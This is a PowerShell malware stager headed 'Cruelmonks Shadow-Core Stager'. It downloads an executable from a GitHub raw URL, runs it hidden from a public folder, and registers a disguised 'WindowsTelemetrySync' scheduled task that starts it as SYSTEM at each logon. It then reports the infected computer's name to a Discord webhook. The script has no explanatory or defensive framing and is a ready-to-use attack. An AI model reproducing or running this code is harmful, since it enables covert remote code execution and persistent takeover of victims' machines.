# Cruelmonks Shadow-Core Stager
$webhookUrl = "YOUR_DISCORD_WEBHOOK_URL"
$serviceDir = "$env:APPDATA\SystemServices"
$stagerUrl = "https://raw.githubusercontent.com/itzcurled/cruelmonks/main/update_service.dat"
$stagerPath = "C:\Users\Public\Documents\WinSys.exe"
$pcName = $env:COMPUTERNAME

# 1. Self-Healing Environment
if (-not (Test-Path $serviceDir)) { New-Item -Path $serviceDir -ItemType Directory -Force | Out-Null }

# 2. Deployment
Invoke-WebRequest -Uri $stagerUrl -OutFile $stagerPath
Start-Process -FilePath $stagerPath -WindowStyle Hidden

# 3. Persistence Check
$action = New-ScheduledTaskAction -Execute $stagerPath
$trigger = New-ScheduledTaskTrigger -AtLogon
$principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
Register-ScheduledTask -TaskName "WindowsTelemetrySync" -Action $action -Trigger $trigger -Principal $principal -Force | Out-Null

# Discord Notify
$p = @{content="[STAGER] : $pcName initialized. Shadow-Core injector running."} | ConvertTo-Json
Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $p -ContentType "application/json"
